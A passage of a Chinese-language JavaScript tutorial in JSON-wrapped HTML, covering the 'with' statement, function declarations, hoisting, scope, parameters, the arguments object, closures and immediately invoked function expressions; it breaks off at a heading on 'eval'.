4</code></pre><p>上面代码中，对象<code>obj</code>并没有<code>p1</code>属性，对<code>p1</code>赋值等于创造了一个全局变量<code>p1</code>。正确的写法应该是，先定义对象<code>obj</code>的属性<code>p1</code>，然后在<code>with</code>区块内操作它。</p>\n<p>这是因为<code>with</code>区块没有改变作用域，它的内部依然是当前作用域。这造成了<code>with</code>语句的一个很大的弊病，就是绑定对象不明确。</p>\n<pre class=\"prettyprint language-javascript\"><code>with (obj) {\n  console.log(x);\n}</code></pre><p>单纯从上面的代码块，根本无法判断<code>x</code>到底是全局变量，还是对象<code>obj</code>的一个属性。这非常不利于代码的除错和模块化，编译器也无法对这段代码进行优化，只能留到运行时判断，这就拖慢了运行速度。因此，建议不要使用<code>with</code>语句，可以考虑用一个临时变量代替<code>with</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>with(obj1.obj2.obj3) {\n  console.log(p1 + p2);\n}\n\n// 可以写成\nvar temp = obj1.obj2.obj3;\nconsole.log(temp.p1 + temp.p2);</code></pre>\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Dr. Axel Rauschmayer，<a href=\"http://www.2ality.com/2012/10/javascript-properties.html\">Object properties in JavaScript</a></li>\n<li>Lakshan Perera, <a href=\"http://www.laktek.com/2012/12/29/revisiting-javascript-objects/\">Revisiting JavaScript Objects</a></li>\n<li>Angus Croll, <a href=\"http://javascriptweblog.wordpress.com/2010/09/27/the-secret-life-of-javascript-primitives/\">The Secret Life of JavaScript Primitives</a>i</li>\n<li>Dr. Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/06/with-statement.html\">JavaScript’s with statement and why it’s deprecated</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"函数","link":"/types/function.html"}],"content":"\n        <h1>\n            <a href='#函数' class='header-anchor'>#</a>\n            <span>函数</span>\n        </h1>\n    <p>函数是一段可以反复调用的代码块。函数还能接受输入的参数，不同的参数会返回不同的值。</p>\n\n        <h2>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h2>\n    \n        <h3>\n            <a href='#函数的声明' class='header-anchor'>#</a>\n            <span>函数的声明</span>\n        </h3>\n    <p>JavaScript 有三种声明函数的方法。</p>\n<p><strong>（1）function 命令</strong></p>\n<p><code>function</code>命令声明的代码区块，就是一个函数。<code>function</code>命令后面是函数名，函数名后面是一对圆括号，里面是传入函数的参数。函数体放在大括号里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>function print(s) {\n  console.log(s);\n}</code></pre><p>上面的代码命名了一个<code>print</code>函数，以后使用<code>print()</code>这种形式，就可以调用相应的代码。这叫做函数的声明（Function Declaration）。</p>\n<p><strong>（2）函数表达式</strong></p>\n<p>除了用<code>function</code>命令声明函数，还可以采用变量赋值的写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = function(s) {\n  console.log(s);\n};</code></pre><p>这种写法将一个匿名函数赋值给变量。这时，这个匿名函数又称函数表达式（Function Expression），因为赋值语句的等号右侧只能放表达式。</p>\n<p>采用函数表达式声明函数时，<code>function</code>命令后面不带有函数名。如果加上函数名，该函数名只在函数体内部有效，在函数体外部无效。</p>\n<pre class=\"prettyprint language-javascript\"><code>var print = function x(){\n  console.log(typeof x);\n};\n\nx\n// ReferenceError: x is not defined\n\nprint()\n// function</code></pre><p>上面代码在函数表达式中，加入了函数名<code>x</code>。这个<code>x</code>只在函数体内部可用，指代函数表达式本身，其他地方都不可用。这种写法的用处有两个，一是可以在函数体内部调用自身，二是方便除错（除错工具显示函数调用栈时，将显示函数名，而不再显示这里是一个匿名函数）。因此，下面的形式声明函数也非常常见。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function f() {};</code></pre><p>需要注意的是，函数的表达式需要在语句的结尾加上分号，表示语句结束。而函数的声明在结尾的大括号后面不用加分号。总的来说，这两种声明函数的方式，差别很细微，可以近似认为是等价的。</p>\n<p><strong>（3）Function 构造函数</strong></p>\n<p>第三种声明函数的方式是<code>Function</code>构造函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var add = new Function(\n  &#039;x&#039;,\n  &#039;y&#039;,\n  &#039;return x + y&#039;\n);\n\n// 等同于\nfunction add(x, y) {\n  return x + y;\n}</code></pre><p>上面代码中，<code>Function</code>构造函数接受三个参数，除了最后一个参数是<code>add</code>函数的“函数体”，其他参数都是<code>add</code>函数的参数。</p>\n<p>你可以传递任意数量的参数给<code>Function</code>构造函数，只有最后一个参数会被当做函数体，如果只有一个参数，该参数就是函数体。</p>\n<pre class=\"prettyprint language-javascript\"><code>var foo = new Function(\n  &#039;return &quot;hello world&quot;&#039;\n);\n\n// 等同于\nfunction foo() {\n  return &#039;hello world&#039;;\n}</code></pre><p><code>Function</code>构造函数可以不使用<code>new</code>命令，返回结果完全一样。</p>\n<p>总的来说，这种声明函数的方式非常不直观，几乎无人使用。</p>\n\n        <h3>\n            <a href='#函数的重复声明' class='header-anchor'>#</a>\n            <span>函数的重复声明</span>\n        </h3>\n    <p>如果同一个函数被多次声明，后面的声明就会覆盖前面的声明。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  console.log(1);\n}\nf() // 2\n\nfunction f() {\n  console.log(2);\n}\nf() // 2</code></pre><p>上面代码中，后一次的函数声明覆盖了前面一次。而且，由于函数名的提升（参见下文），前一次声明在任何时候都是无效的，这一点要特别注意。</p>\n\n        <h3>\n            <a href='#圆括号运算符，return-语句和递归' class='header-anchor'>#</a>\n            <span>圆括号运算符，return 语句和递归</span>\n        </h3>\n    <p>调用函数时，要使用圆括号运算符。圆括号之中，可以加入函数的参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\nadd(1, 1) // 2</code></pre><p>上面代码中，函数名后面紧跟一对圆括号，就会调用这个函数。</p>\n<p>函数体内部的<code>return</code>语句，表示返回。JavaScript 引擎遇到<code>return</code>语句，就直接返回<code>return</code>后面的那个表达式的值，后面即使还有语句，也不会得到执行。也就是说，<code>return</code>语句所带的那个表达式，就是函数的返回值。<code>return</code>语句不是必需的，如果没有的话，该函数就不返回任何值，或者说返回<code>undefined</code>。</p>\n<p>函数可以调用自身，这就是递归（recursion）。下面就是通过递归，计算斐波那契数列的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>function fib(num) {\n  if (num === 0) return 0;\n  if (num === 1) return 1;\n  return fib(num - 2) + fib(num - 1);\n}\n\nfib(6) // 8</code></pre><p>上面代码中，<code>fib</code>函数内部又调用了<code>fib</code>，计算得到斐波那契数列的第6个元素是8。</p>\n\n        <h3>\n            <a href='#第一等公民' class='header-anchor'>#</a>\n            <span>第一等公民</span>\n        </h3>\n    <p>JavaScript 语言将函数看作一种值，与其它值（数值、字符串、布尔值等等）地位相同。凡是可以使用值的地方，就能使用函数。比如，可以把函数赋值给变量和对象的属性，也可以当作参数传入其他函数，或者作为函数的结果返回。函数只是一个可以执行的值，此外并无特殊之处。</p>\n<p>由于函数与其他数据类型地位平等，所以在 JavaScript 语言中又称函数为第一等公民。</p>\n<pre class=\"prettyprint language-javascript\"><code>function add(x, y) {\n  return x + y;\n}\n\n// 将函数赋值给一个变量\nvar operator = add;\n\n// 将函数作为参数和返回值\nfunction a(op){\n  return op;\n}\na(add)(1, 1)\n// 2</code></pre>\n        <h3>\n            <a href='#函数名的提升' class='header-anchor'>#</a>\n            <span>函数名的提升</span>\n        </h3>\n    <p>JavaScript 引擎将函数名视同变量名，所以采用<code>function</code>命令声明函数时，整个函数会像变量声明一样，被提升到代码头部。所以，下面的代码不会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>f();\n\nfunction f() {}</code></pre><p>表面上，上面代码好像在声明之前就调用了函数<code>f</code>。但是实际上，由于“变量提升”，函数<code>f</code>被提升到了代码头部，也就是在调用之前已经声明了。但是，如果采用赋值语句定义函数，JavaScript 就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>f();\nvar f = function (){};\n// TypeError: undefined is not a function</code></pre><p>上面的代码等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f;\nf();\nf = function () {};</code></pre><p>上面代码第二行，调用<code>f</code>的时候，<code>f</code>只是被声明了，还没有被赋值，等于<code>undefined</code>，所以会报错。因此，如果同时采用<code>function</code>命令和赋值语句声明同一个函数，最后总是采用赋值语句的定义。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(&#039;1&#039;);\n}\n\nfunction f() {\n  console.log(&#039;2&#039;);\n}\n\nf() // 1</code></pre>\n        <h2>\n            <a href='#函数的属性和方法' class='header-anchor'>#</a>\n            <span>函数的属性和方法</span>\n        </h2>\n    \n        <h3>\n            <a href='#name-属性' class='header-anchor'>#</a>\n            <span>name 属性</span>\n        </h3>\n    <p>函数的<code>name</code>属性返回函数的名字。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {}\nf1.name // &quot;f1&quot;</code></pre><p>如果是通过变量赋值定义的函数，那么<code>name</code>属性返回变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f2 = function () {};\nf2.name // &quot;f2&quot;</code></pre><p>但是，上面这种情况，只有在变量的值是一个匿名函数时才是如此。如果变量的值是一个具名函数，那么<code>name</code>属性返回<code>function</code>关键字之后的那个函数名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f3 = function myName() {};\nf3.name // &#039;myName&#039;</code></pre><p>上面代码中，<code>f3.name</code>返回函数表达式的名字。注意，真正的函数名还是<code>f3</code>，而<code>myName</code>这个名字只在函数体内部可用。</p>\n<p><code>name</code>属性的一个用处，就是获取参数函数的名字。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myFunc = function () {};\n\nfunction test(f) {\n  console.log(f.name);\n}\n\ntest(myFunc) // myFunc</code></pre><p>上面代码中，函数<code>test</code>内部通过<code>name</code>属性，就可以知道传入的参数是什么函数。</p>\n\n        <h3>\n            <a href='#length-属性' class='header-anchor'>#</a>\n            <span>length 属性</span>\n        </h3>\n    <p>函数的<code>length</code>属性返回函数预期传入的参数个数，即函数定义之中的参数个数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {}\nf.length // 2</code></pre><p>上面代码定义了空函数<code>f</code>，它的<code>length</code>属性就是定义时的参数个数。不管调用时输入了多少个参数，<code>length</code>属性始终等于2。</p>\n<p><code>length</code>属性提供了一种机制，判断定义时和调用时参数的差异，以便实现面向对象编程的”方法重载“（overload）。</p>\n\n        <h3>\n            <a href='#toString()' class='header-anchor'>#</a>\n            <span>toString()</span>\n        </h3>\n    <p>函数的<code>toString</code>方法返回一个字符串，内容是函数的源码。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  a();\n  b();\n  c();\n}\n\nf.toString()\n// function f() {\n//  a();\n//  b();\n//  c();\n// }</code></pre><p>函数内部的注释也可以返回。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {/*\n  这是一个\n  多行注释\n*/}\n\nf.toString()\n// &quot;function f(){/*\n//   这是一个\n//   多行注释\n// */}&quot;</code></pre><p>利用这一点，可以变相实现多行字符串。</p>\n<pre class=\"prettyprint language-javascript\"><code>var multiline = function (fn) {\n  var arr = fn.toString().split(&#039;\\n&#039;);\n  return arr.slice(1, arr.length - 1).join(&#039;\\n&#039;);\n};\n\nfunction f() {/*\n  这是一个\n  多行注释\n*/}\n\nmultiline(f);\n// &quot; 这是一个\n//   多行注释&quot;</code></pre>\n        <h2>\n            <a href='#函数作用域' class='header-anchor'>#</a>\n            <span>函数作用域</span>\n        </h2>\n    \n        <h3>\n            <a href='#定义' class='header-anchor'>#</a>\n            <span>定义</span>\n        </h3>\n    <p>作用域（scope）指的是变量存在的范围。在 ES5 的规范中，Javascript 只有两种作用域：一种是全局作用域，变量在整个程序中一直存在，所有地方都可以读取；另一种是函数作用域，变量只在函数内部存在。ES6 又新增了块级作用域，本教程不涉及。</p>\n<p>函数外部声明的变量就是全局变量（global variable），它可以在函数内部读取。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = 1;\n\nfunction f() {\n  console.log(v);\n}\n\nf()\n// 1</code></pre><p>上面的代码表明，函数<code>f</code>内部可以读取全局变量<code>v</code>。</p>\n<p>在函数内部定义的变量，外部无法读取，称为“局部变量”（local variable）。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(){\n  var v = 1;\n}\n\nv // ReferenceError: v is not defined</code></pre><p>上面代码中，变量<code>v</code>在函数内部定义，所以是一个局部变量，函数之外就无法读取。</p>\n<p>函数内部定义的变量，会在该作用域内覆盖同名全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var v = 1;\n\nfunction f(){\n  var v = 2;\n  console.log(v);\n}\n\nf() // 2\nv // 1</code></pre><p>上面代码中，变量<code>v</code>同时在函数的外部和内部有定义。结果，在函数内部定义，局部变量<code>v</code>覆盖了全局变量<code>v</code>。</p>\n<p>注意，对于<code>var</code>命令来说，局部变量只能在函数内部声明，在其他区块中声明，一律都是全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (true) {\n  var x = 5;\n}\nconsole.log(x);  // 5</code></pre><p>上面代码中，变量<code>x</code>在条件判断区块之中声明，结果就是一个全局变量，可以在区块之外读取。</p>\n\n        <h3>\n            <a href='#函数内部的变量提升' class='header-anchor'>#</a>\n            <span>函数内部的变量提升</span>\n        </h3>\n    <p>与全局作用域一样，函数作用域内部也会产生“变量提升”现象。<code>var</code>命令声明的变量，不管在什么位置，变量声明都会被提升到函数体的头部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo(x) {\n  if (x &gt; 100) {\n    var tmp = x - 100;\n  }\n}\n\n// 等同于\nfunction foo(x) {\n  var tmp;\n  if (x &gt; 100) {\n    tmp = x - 100;\n  };\n}</code></pre>\n        <h3>\n            <a href='#函数本身的作用域' class='header-anchor'>#</a>\n            <span>函数本身的作用域</span>\n        </h3>\n    <p>函数本身也是一个值，也有自己的作用域。它的作用域与变量一样，就是其声明时所在的作用域，与其运行时所在的作用域无关。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\nvar x = function () {\n  console.log(a);\n};\n\nfunction f() {\n  var a = 2;\n  x();\n}\n\nf() // 1</code></pre><p>上面代码中，函数<code>x</code>是在函数<code>f</code>的外部声明的，所以它的作用域绑定外层，内部变量<code>a</code>不会到函数<code>f</code>体内取值，所以输出<code>1</code>，而不是<code>2</code>。</p>\n<p>总之，函数执行时所在的作用域，是定义时的作用域，而不是调用时所在的作用域。</p>\n<p>很容易犯错的一点是，如果函数<code>A</code>调用函数<code>B</code>，却没考虑到函数<code>B</code>不会引用函数<code>A</code>的内部变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = function () {\n  console.log(a);\n};\n\nfunction y(f) {\n  var a = 2;\n  f();\n}\n\ny(x)\n// ReferenceError: a is not defined</code></pre><p>上面代码将函数<code>x</code>作为参数，传入函数<code>y</code>。但是，函数<code>x</code>是在函数<code>y</code>体外声明的，作用域绑定外层，因此找不到函数<code>y</code>的内部变量<code>a</code>，导致报错。</p>\n<p>同样的，函数体内部声明的函数，作用域绑定函数体内部。</p>\n<pre class=\"prettyprint language-javascript\"><code>function foo() {\n  var x = 1;\n  function bar() {\n    console.log(x);\n  }\n  return bar;\n}\n\nvar x = 2;\nvar f = foo();\nf() // 1</code></pre><p>上面代码中，函数<code>foo</code>内部声明了一个函数<code>bar</code>，<code>bar</code>的作用域绑定<code>foo</code>。当我们在<code>foo</code>外部取出<code>bar</code>执行时，变量<code>x</code>指向的是<code>foo</code>内部的<code>x</code>，而不是<code>foo</code>外部的<code>x</code>。正是这种机制，构成了下文要讲解的“闭包”现象。</p>\n\n        <h2>\n            <a href='#参数' class='header-anchor'>#</a>\n            <span>参数</span>\n        </h2>\n    \n        <h3>\n            <a href='#概述' class='header-anchor'>#</a>\n            <span>概述</span>\n        </h3>\n    <p>函数运行的时候，有时需要提供外部数据，不同的外部数据会得到不同的结果，这种外部数据就叫参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function square(x) {\n  return x * x;\n}\n\nsquare(2) // 4\nsquare(3) // 9</code></pre><p>上式的<code>x</code>就是<code>square</code>函数的参数。每次运行的时候，需要提供这个值，否则得不到结果。</p>\n\n        <h3>\n            <a href='#参数的省略' class='header-anchor'>#</a>\n            <span>参数的省略</span>\n        </h3>\n    <p>函数参数不是必需的，Javascript 允许省略参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {\n  return a;\n}\n\nf(1, 2, 3) // 1\nf(1) // 1\nf() // undefined\n\nf.length // 2</code></pre><p>上面代码的函数<code>f</code>定义了两个参数，但是运行时无论提供多少个参数（或者不提供参数），JavaScript 都不会报错。省略的参数的值就变为<code>undefined</code>。需要注意的是，函数的<code>length</code>属性与实际传入的参数个数无关，只反映函数预期传入的参数个数。</p>\n<p>但是，没有办法只省略靠前的参数，而保留靠后的参数。如果一定要省略靠前的参数，只有显式传入<code>undefined</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, b) {\n  return a;\n}\n\nf( , 1) // SyntaxError: Unexpected token ,(…)\nf(undefined, 1) // undefined</code></pre><p>上面代码中，如果省略第一个参数，就会报错。</p>\n\n        <h3>\n            <a href='#传递方式' class='header-anchor'>#</a>\n            <span>传递方式</span>\n        </h3>\n    <p>函数参数如果是原始类型的值（数值、字符串、布尔值），传递方式是传值传递（passes by value）。这意味着，在函数体内修改参数值，不会影响到函数外部。</p>\n<pre class=\"prettyprint language-javascript\"><code>var p = 2;\n\nfunction f(p) {\n  p = 3;\n}\nf(p);\n\np // 2</code></pre><p>上面代码中，变量<code>p</code>是一个原始类型的值，传入函数<code>f</code>的方式是传值传递。因此，在函数内部，<code>p</code>的值是原始值的拷贝，无论怎么修改，都不会影响到原始值。</p>\n<p>但是，如果函数参数是复合类型的值（数组、对象、其他函数），传递方式是传址传递（pass by reference）。也就是说，传入函数的原始值的地址，因此在函数内部修改参数，将会影响到原始值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = { p: 1 };\n\nfunction f(o) {\n  o.p = 2;\n}\nf(obj);\n\nobj.p // 2</code></pre><p>上面代码中，传入函数<code>f</code>的是参数对象<code>obj</code>的地址。因此，在函数内部修改<code>obj</code>的属性<code>p</code>，会影响到原始值。</p>\n<p>注意，如果函数内部修改的，不是参数对象的某个属性，而是替换掉整个参数，这时不会影响到原始值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var obj = [1, 2, 3];\n\nfunction f(o) {\n  o = [2, 3, 4];\n}\nf(obj);\n\nobj // [1, 2, 3]</code></pre><p>上面代码中，在函数<code>f</code>内部，参数对象<code>obj</code>被整个替换成另一个值。这时不会影响到原始值。这是因为，形式参数（<code>o</code>）的值实际是参数<code>obj</code>的地址，重新对<code>o</code>赋值导致<code>o</code>指向另一个地址，保存在原地址上的值当然不受影响。</p>\n\n        <h3>\n            <a href='#同名参数' class='header-anchor'>#</a>\n            <span>同名参数</span>\n        </h3>\n    <p>如果有同名的参数，则取最后出现的那个值。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(a);\n}\n\nf(1, 2) // 2</code></pre><p>上面代码中，函数<code>f</code>有两个参数，且参数名都是<code>a</code>。取值的时候，以后面的<code>a</code>为准，即使后面的<code>a</code>没有值或被省略，也是以其为准。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(a);\n}\n\nf(1) // undefined</code></pre><p>调用函数<code>f</code>的时候，没有提供第二个参数，<code>a</code>的取值就变成了<code>undefined</code>。这时，如果要获得第一个<code>a</code>的值，可以使用<code>arguments</code>对象。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f(a, a) {\n  console.log(arguments[0]);\n}\n\nf(1) // 1</code></pre>\n        <h3>\n            <a href='#arguments-对象' class='header-anchor'>#</a>\n            <span>arguments 对象</span>\n        </h3>\n    <p><strong>（1）定义</strong></p>\n<p>由于 JavaScript 允许函数有不定数目的参数，所以需要一种机制，可以在函数体内部读取所有参数。这就是<code>arguments</code>对象的由来。</p>\n<p><code>arguments</code>对象包含了函数运行时的所有参数，<code>arguments[0]</code>就是第一个参数，<code>arguments[1]</code>就是第二个参数，以此类推。这个对象只有在函数体内部，才可以使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function (one) {\n  console.log(arguments[0]);\n  console.log(arguments[1]);\n  console.log(arguments[2]);\n}\n\nf(1, 2, 3)\n// 1\n// 2\n// 3</code></pre><p>正常模式下，<code>arguments</code>对象可以在运行时修改。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function(a, b) {\n  arguments[0] = 3;\n  arguments[1] = 2;\n  return a + b;\n}\n\nf(1, 1) // 5</code></pre><p>上面代码中，函数<code>f</code>调用时传入的参数，在函数内部被修改成<code>3</code>和<code>2</code>。</p>\n<p>严格模式下，<code>arguments</code>对象是一个只读对象，修改它是无效的，但不会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function(a, b) {\n  &#039;use strict&#039;; // 开启严格模式\n  arguments[0] = 3; // 无效\n  arguments[1] = 2; // 无效\n  return a + b;\n}\n\nf(1, 1) // 2</code></pre><p>上面代码中，函数体内是严格模式，这时修改<code>arguments</code>对象就是无效的。</p>\n<p>通过<code>arguments</code>对象的<code>length</code>属性，可以判断函数调用时到底带几个参数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f() {\n  return arguments.length;\n}\n\nf(1, 2, 3) // 3\nf(1) // 1\nf() // 0</code></pre><p><strong>（2）与数组的关系</strong></p>\n<p>需要注意的是，虽然<code>arguments</code>很像数组，但它是一个对象。数组专有的方法（比如<code>slice</code>和<code>forEach</code>），不能在<code>arguments</code>对象上直接使用。</p>\n<p>如果要让<code>arguments</code>对象使用数组方法，真正的解决方法是将<code>arguments</code>转为真正的数组。下面是两种常用的转换方法：<code>slice</code>方法和逐一填入新数组。</p>\n<pre class=\"prettyprint language-javascript\"><code>var args = Array.prototype.slice.call(arguments);\n\n// 或者\nvar args = [];\nfor (var i = 0; i &lt; arguments.length; i++) {\n  args.push(arguments[i]);\n}</code></pre><p><strong>（3）callee 属性</strong></p>\n<p><code>arguments</code>对象带有一个<code>callee</code>属性，返回它所对应的原函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>var f = function () {\n  console.log(arguments.callee === f);\n}\n\nf() // true</code></pre><p>可以通过<code>arguments.callee</code>，达到调用函数自身的目的。这个属性在严格模式里面是禁用的，因此不建议使用。</p>\n\n        <h2>\n            <a href='#函数的其他知识点' class='header-anchor'>#</a>\n            <span>函数的其他知识点</span>\n        </h2>\n    \n        <h3>\n            <a href='#闭包' class='header-anchor'>#</a>\n            <span>闭包</span>\n        </h3>\n    <p>闭包（closure）是 Javascript 语言的一个难点，也是它的特色，很多高级应用都要依靠闭包实现。</p>\n<p>理解闭包，首先必须理解变量作用域。前面提到，JavaScript 有两种作用域：全局作用域和函数作用域。函数内部可以直接读取全局变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var n = 999;\n\nfunction f1() {\n  console.log(n);\n}\nf1() // 999</code></pre><p>上面代码中，函数<code>f1</code>可以读取全局变量<code>n</code>。</p>\n<p>但是，函数外部无法读取函数内部声明的变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n}\n\nconsole.log(n)\n// Uncaught ReferenceError: n is not defined(</code></pre><p>上面代码中，函数<code>f1</code>内部声明的变量<code>n</code>，函数外是无法读取的。</p>\n<p>如果出于种种原因，需要得到函数内的局部变量。正常情况下，这是办不到的，只有通过变通方法才能实现。那就是在函数的内部，再定义一个函数。</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n  function f2() {\n　　console.log(n); // 999\n  }\n}</code></pre><p>上面代码中，函数<code>f2</code>就在函数<code>f1</code>内部，这时<code>f1</code>内部的所有局部变量，对<code>f2</code>都是可见的。但是反过来就不行，<code>f2</code>内部的局部变量，对<code>f1</code>就是不可见的。这就是 JavaScript 语言特有的&quot;链式作用域&quot;结构（chain scope），子对象会一级一级地向上寻找所有父对象的变量。所以，父对象的所有变量，对子对象都是可见的，反之则不成立。</p>\n<p>既然<code>f2</code>可以读取<code>f1</code>的局部变量，那么只要把<code>f2</code>作为返回值，我们不就可以在<code>f1</code>外部读取它的内部变量了吗！</p>\n<pre class=\"prettyprint language-javascript\"><code>function f1() {\n  var n = 999;\n  function f2() {\n    console.log(n);\n  }\n  return f2;\n}\n\nvar result = f1();\nresult(); // 999</code></pre><p>上面代码中，函数<code>f1</code>的返回值就是函数<code>f2</code>，由于<code>f2</code>可以读取<code>f1</code>的内部变量，所以就可以在外部获得<code>f1</code>的内部变量了。</p>\n<p>闭包就是函数<code>f2</code>，即能够读取其他函数内部变量的函数。由于在 JavaScript 语言中，只有函数内部的子函数才能读取内部变量，因此可以把闭包简单理解成“定义在一个函数内部的函数”。闭包最大的特点，就是它可以“记住”诞生的环境，比如<code>f2</code>记住了它诞生的环境<code>f1</code>，所以从<code>f2</code>可以得到<code>f1</code>的内部变量。在本质上，闭包就是将函数内部和函数外部连接起来的一座桥梁。</p>\n<p>闭包的最大用处有两个，一个是可以读取函数内部的变量，另一个就是让这些变量始终保持在内存中，即闭包可以使得它诞生环境一直存在。请看下面的例子，闭包使得内部变量记住上一次调用时的运算结果。</p>\n<pre class=\"prettyprint language-javascript\"><code>function createIncrementor(start) {\n  return function () {\n    return start++;\n  };\n}\n\nvar inc = createIncrementor(5);\n\ninc() // 5\ninc() // 6\ninc() // 7</code></pre><p>上面代码中，<code>start</code>是函数<code>createIncrementor</code>的内部变量。通过闭包，<code>start</code>的状态被保留了，每一次调用都是在上一次调用的基础上进行计算。从中可以看到，闭包<code>inc</code>使得函数<code>createIncrementor</code>的内部环境，一直存在。所以，闭包可以看作是函数内部作用域的一个接口。</p>\n<p>为什么会这样呢？原因就在于<code>inc</code>始终在内存中，而<code>inc</code>的存在依赖于<code>createIncrementor</code>，因此也始终在内存中，不会在调用结束后，被垃圾回收机制回收。</p>\n<p>闭包的另一个用处，是封装对象的私有属性和私有方法。</p>\n<pre class=\"prettyprint language-javascript\"><code>function Person(name) {\n  var _age;\n  function setAge(n) {\n    _age = n;\n  }\n  function getAge() {\n    return _age;\n  }\n\n  return {\n    name: name,\n    getAge: getAge,\n    setAge: setAge\n  };\n}\n\nvar p1 = Person(&#039;张三&#039;);\np1.setAge(25);\np1.getAge() // 25</code></pre><p>上面代码中，函数<code>Person</code>的内部变量<code>_age</code>，通过闭包<code>getAge</code>和<code>setAge</code>，变成了返回对象<code>p1</code>的私有变量。</p>\n<p>注意，外层函数每次运行，都会生成一个新的闭包，而这个闭包又会保留外层函数的内部变量，所以内存消耗很大。因此不能滥用闭包，否则会造成网页的性能问题。</p>\n\n        <h3>\n            <a href='#立即调用的函数表达式（IIFE）' class='header-anchor'>#</a>\n            <span>立即调用的函数表达式（IIFE）</span>\n        </h3>\n    <p>在 Javascript 中，圆括号<code>()</code>是一种运算符，跟在函数名之后，表示调用该函数。比如，<code>print()</code>就表示调用<code>print</code>函数。</p>\n<p>有时，我们需要在定义函数之后，立即调用该函数。这时，你不能在函数的定义之后加上圆括号，这会产生语法错误。</p>\n<pre class=\"prettyprint language-javascript\"><code>function(){ /* code */ }();\n// SyntaxError: Unexpected token (</code></pre><p>产生这个错误的原因是，<code>function</code>这个关键字即可以当作语句，也可以当作表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 语句\nfunction f() {}\n\n// 表达式\nvar f = function f() {}</code></pre><p>为了避免解析上的歧义，JavaScript 引擎规定，如果<code>function</code>关键字出现在行首，一律解释成语句。因此，JavaScript引擎看到行首是<code>function</code>关键字之后，认为这一段都是函数的定义，不应该以圆括号结尾，所以就报错了。</p>\n<p>解决方法就是不要让<code>function</code>出现在行首，让引擎将其理解成一个表达式。最简单的处理，就是将其放在一个圆括号里面。</p>\n<pre class=\"prettyprint language-javascript\"><code>(function(){ /* code */ }());\n// 或者\n(function(){ /* code */ })();</code></pre><p>上面两种写法都是以圆括号开头，引擎就会认为后面跟的是一个表示式，而不是函数定义语句，所以就避免了错误。这就叫做“立即调用的函数表达式”（Immediately-Invoked Function Expression），简称 IIFE。</p>\n<p>注意，上面两种写法最后的分号都是必须的。如果省略分号，遇到连着两个 IIFE，可能就会报错。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 报错\n(function(){ /* code */ }())\n(function(){ /* code */ }())</code></pre><p>上面代码的两行之间没有分号，JavaScript 会将它们连在一起解释，将第二行解释为第一行的参数。</p>\n<p>推而广之，任何让解释器以表达式来处理函数定义的方法，都能产生同样的效果，比如下面三种写法。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = function(){ return 10; }();\ntrue &amp;&amp; function(){ /* code */ }();\n0, function(){ /* code */ }();</code></pre><p>甚至像下面这样写，也是可以的。</p>\n<pre class=\"prettyprint language-javascript\"><code>!function () { /* code */ }();\n~function () { /* code */ }();\n-function () { /* code */ }();\n+function () { /* code */ }();</code></pre><p>通常情况下，只对匿名函数使用这种“立即执行的函数表达式”。它的目的有两个：一是不必为函数命名，避免了污染全局变量；二是 IIFE 内部形成了一个单独的作用域，可以封装一些外部无法读取的私有变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 写法一\nvar tmp = newData;\nprocessData(tmp);\nstoreData(tmp);\n\n// 写法二\n(function () {\n  var tmp = newData;\n  processData(tmp);\n  storeData(tmp);\n}());</code></pre><p>上面代码中，写法二比写法一更好，因为完全避免了污染全局变量。</p>\n\n        <h2>\n            <a href='#eval-命令' class='header-anchor'>#</a>\n            <span>eval 命令</span>\n        </h2>\n    \n        <h3>\n        